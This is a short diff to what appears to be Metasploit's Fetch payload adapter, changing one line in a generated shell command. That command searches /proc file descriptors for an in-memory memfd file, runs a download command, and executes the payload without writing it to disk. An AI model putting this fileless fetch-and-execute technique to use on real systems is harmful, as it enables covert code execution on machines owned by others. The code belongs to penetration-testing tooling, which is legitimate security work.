@@ -244,7 +244,7 @@ module Msf::Payload::Adapter::Fetch
     # and execute it
     cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
     cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if [ $( #{get_file_cmd} >/dev/null; echo $?) -eq \"0\" ]"
+    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
     cmd << '; then $f'
     cmd << '; FOUND=1'
     cmd << '; break'
